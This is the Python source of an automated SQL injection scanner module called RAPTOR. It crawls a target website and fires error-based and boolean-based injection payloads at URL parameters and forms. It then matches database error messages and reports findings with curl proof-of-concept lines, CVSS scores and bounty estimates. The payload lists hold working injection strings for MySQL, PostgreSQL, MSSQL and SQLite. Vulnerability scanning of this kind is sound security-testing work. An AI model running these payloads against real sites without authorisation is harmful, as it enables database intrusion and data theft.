"""
RAPTOR SQL Injection Testing Module v3.1
==========================================
Key improvements over v3.0:
- Crawls target first to find REAL pages with parameters/forms
- Tests actual URL params and POST forms (not invented params on the root)
- Shorter timeout avoids hanging on dead URLs
- Error-based + Boolean-based + Form POST testing
"""

import re
import time
import json
import copy
import asyncio
import random
import hashlib
from difflib import SequenceMatcher
from typing import List, Dict, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, urlencode

from core.base_module import BaseModule, Finding


# ── DB error signatures ───────────────────────────────────────────────────────

DB_ERRORS: Dict[str, List[str]] = {
    'mysql': [
        r'SQL syntax.*MySQL', r'Warning.*mysql_.*', r'MySqlClient\.',
        r'MySqlException', r'check the manual that corresponds to your MySQL',
        r'You have an error in your SQL syntax',
        r'mysql_fetch_array\(\)', r'supplied argument is not a valid MySQL',
        r'Column count doesn\'t match',
    ],
    'postgres': [
        r'PostgreSQL.*ERROR', r'Warning.*pg_.*', r'Npgsql\.',
        r'PG::Error', r'PSQLException', r'unterminated quoted string',
        r'ERROR:.*syntax error at or near',
    ],
    'mssql': [
        r'Microsoft.*ODBC.*SQL', r'SQL Server.*Driver', r'\[SQL Server\]',
        r'SqlException', r'Unclosed quotation mark after the character string',
        r'Incorrect syntax near', r'Msg \d+, Level \d+',
    ],
    'oracle': [
        r'ORA-[0-9]{5}', r'Oracle error', r'quoted string not properly terminated',
    ],
    'sqlite': [
        r'SQLiteException', r'sqlite3\.OperationalError',
        r'SQLite.*error', r'near \".*\": syntax error',
    ],
    'generic': [
        r'SQL syntax.*error', r'syntax error.*SQL',
        r'unclosed quotation mark', r'Warning.*odbc_',
        r'JET Database Engine', r'JDBC.*error',
        r'Dynamic SQL Error', r'Unexpected end of command',
    ],
}


def _similarity(a: str, b: str) -> float:
    return SequenceMatcher(None, a[:4000], b[:4000]).ratio()


@dataclass
class SQLiPayload:
    payload:   str
    technique: str
    db_type:   str
    indicator: str
    severity:  str = 'High'


class SQLiTester(BaseModule):

    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.findings:      List[Finding] = []
        self.tested_params: Set[str]      = set()
        self.waf_name:      Optional[str] = None
        self.detected_db:   Optional[str] = None
        self.time_delay     = config.get('blind_timeout', 5)
        self.boolean_threshold = config.get('boolean_diff_threshold', 0.08)
        self.max_params     = config.get('max_params', 20)

    async def __aenter__(self):
        return self

    async def __aexit__(self, *_):
        return False

    # ── Entry point ───────────────────────────────────────────────────────────

    async def run(self, target: str, **kwargs) -> List[Finding]:
        self.logger.info(f'SQLi scan → {target}')

        # Phase 1: Crawl to find real pages
        self.logger.info('Crawling target for pages with params/forms...')
        pages = await self.crawl_pages(target, max_pages=60)
        self.logger.info(f'Found {len(pages)} pages to test')

        # Phase 2: Test URL params on each page
        sem = asyncio.Semaphore(4)

        async def test_page(page_url: str):
            async with sem:
                parsed = urlparse(page_url)
                params = list(parse_qs(parsed.query).keys())
                if params:
                    await self._phase_error(page_url, params)
                    await self._phase_boolean(page_url, params)

                # Test POST forms
                forms = await self.get_forms(page_url)
                if forms:
                    await self._phase_forms(forms)

        await asyncio.gather(*[test_page(p) for p in pages], return_exceptions=True)

        self.logger.info(f'SQLi complete — {len(self.findings)} finding(s)')
        return self.findings

    # ── Error-based ───────────────────────────────────────────────────────────

    _ERROR_PAYLOADS = [
        ("'",              'generic'),
        ('"',              'generic'),
        ("'--",            'generic'),
        ("'#",             'mysql'),
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -", 'mysql'),
        ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- -",  'mysql'),
        ("' AND 1=CAST((SELECT version()) AS INTEGER)--",                   'postgres'),
        ("' AND 1=CONVERT(INT,(SELECT @@version))--",                       'mssql'),
        ("' AND sqlite_version()--",                                        'sqlite'),
        ("'/**/AND/**/1=1--",                                               'generic'),
    ]

    async def _phase_error(self, target: str, params: List[str]):
        sem = asyncio.Semaphore(4)

        async def test(param: str):
            async with sem:
                combo = f'{target}:{param}:error'
                if combo in self.tested_params:
                    return
                for raw_payload, db_hint in self._ERROR_PAYLOADS:
                    url  = self._build_url(target, param, raw_payload)
                    resp = await self._make_request(url)
                    if not resp:
                        continue
                    body    = await resp.text()
                    db_type = self._match_error(body)
                    if db_type:
                        self._emit(target, param,
                                   SQLiPayload(raw_payload, 'error', db_type, db_type),
                                   'Error-based', {'db_type': db_type}, body)
                        self.tested_params.add(combo)
                        return

        await asyncio.gather(*[test(p) for p in params], return_exceptions=True)

    # ── Boolean-based ─────────────────────────────────────────────────────────

    _BOOL_PAIRS = [
        ("' AND 1=1-- -",    "' AND 1=2-- -",    'generic'),
        ("' AND '1'='1'--",  "' AND '1'='2'--",  'generic'),
        ("1 AND 1=1",        "1 AND 1=2",         'generic'),
        ("' AND 1=1#",       "' AND 1=2#",        'mysql'),
    ]

    async def _phase_boolean(self, target: str, params: List[str]):
        untested = [p for p in params
                    if f'{target}:{p}:error' not in self.tested_params]
        sem = asyncio.Semaphore(3)

        async def test(param: str):
            async with sem:
                combo = f'{target}:{param}:bool'
                if combo in self.tested_params:
                    return
                # Baseline
                baseline_resp = await self._make_request(self._build_url(target, param, '1'))
                if not baseline_resp:
                    return
                baseline = await baseline_resp.text()

                for true_p, false_p, db_hint in self._BOOL_PAIRS:
                    r_true  = await self._make_request(self._build_url(target, param, true_p))
                    r_false = await self._make_request(self._build_url(target, param, false_p))
                    if not r_true or not r_false:
                        continue
                    b_true  = await r_true.text()
                    b_false = await r_false.text()

                    sim_base_true  = _similarity(baseline, b_true)
                    sim_base_false = _similarity(baseline, b_false)

                    if (sim_base_true > 0.92
                            and sim_base_false < (sim_base_true - self.boolean_threshold * 3)):
                        self._emit(target, param,
                                   SQLiPayload(true_p, 'boolean', db_hint, 'boolean'),
                                   'Boolean-based Blind', {}, '')
                        self.tested_params.add(combo)
                        return

        await asyncio.gather(*[test(p) for p in untested], return_exceptions=True)

    # ── Form POST ─────────────────────────────────────────────────────────────

    async def _phase_forms(self, forms: List[Dict]):
        sem = asyncio.Semaphore(3)

        async def test_form(form: Dict):
            async with sem:
                for param in form['inputs']:
                    for raw_payload, db_hint in self._ERROR_PAYLOADS[:8]:
                        test_inputs = copy.deepcopy(form['inputs'])
                        test_inputs[param] = raw_payload

                        if form['method'] == 'POST':
                            resp = await self._make_request(
                                form['action'], method='POST', data=test_inputs)
                        else:
                            resp = await self._make_request(
                                form['action'] + '?' + urlencode(test_inputs))

                        if not resp:
                            continue
                        body    = await resp.text()
                        db_type = self._match_error(body)
                        if db_type:
                            self._emit(form['action'], param,
                                       SQLiPayload(raw_payload, 'error', db_type, db_type),
                                       f'Error-based ({form["method"]} Form)',
                                       {'db_type': db_type}, body)
                            return

        await asyncio.gather(*[test_form(f) for f in forms], return_exceptions=True)

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _match_error(self, body: str) -> Optional[str]:
        for db, patterns in DB_ERRORS.items():
            for pat in patterns:
                if re.search(pat, body, re.IGNORECASE):
                    return db
        return None

    def _build_url(self, base: str, param: str, value: str) -> str:
        parsed = urlparse(base)
        qs     = parse_qs(parsed.query)
        qs[param] = [value]
        new_qs = '&'.join(f'{k}={quote(v[0], safe="")}' for k, v in qs.items())
        return parsed._replace(query=new_qs).geturl()

    # ── Finding factory ───────────────────────────────────────────────────────

    _SEVERITY_MAP = {
        'Error-based':         'High',
        'Boolean-based Blind': 'High',
        'Error-based (POST Form)': 'High',
        'Error-based (GET Form)':  'High',
    }
    _CVSS_MAP   = {'Error-based': 8.6, 'Boolean-based Blind': 8.1}
    _BOUNTY_MAP = {'Error-based': 3000, 'Boolean-based Blind': 4000}

    def _emit(self, target: str, param: str, payload_obj: SQLiPayload,
              technique: str, fingerprint: Dict, evidence_body: str):
        sev    = self._SEVERITY_MAP.get(technique, 'High')
        cvss   = self._CVSS_MAP.get(technique, 8.1)
        bounty = self._BOUNTY_MAP.get(technique, 3000)
        db     = payload_obj.db_type

        f = Finding(
            module      = 'sqli',
            title       = f'[{technique}] SQL Injection in "{param}" ({db})',
            severity    = sev,
            description = (
                f'## SQL Injection — {technique}\n\n'
                f'**Parameter:** `{param}`\n'
                f'**Database:** {db}\n'
                f'**Technique:** {technique}\n\n'
                f'### Payload\n```sql\n{payload_obj.payload}\n```\n\n'
                '### Remediation\n'
                'Use parameterised queries for every SQL call. '
                'Apply least-privilege DB accounts. '
                'Disable verbose errors in production.'
            ),
            evidence    = {
                'parameter': param, 'payload': payload_obj.payload,
                'technique': technique, 'db_type': db,
                'fingerprint': fingerprint,
            },
            poc         = f"curl '{target}?{param}={quote(payload_obj.payload)}'",
            remediation = (
                'Parameterised queries / prepared statements. '
                'Least-privilege DB. Suppress DB errors in production.'
            ),
            cvss_score  = cvss,
            bounty_score= bounty,
            target      = target,
        )
        self.findings.append(f)
        self.add_finding(f)
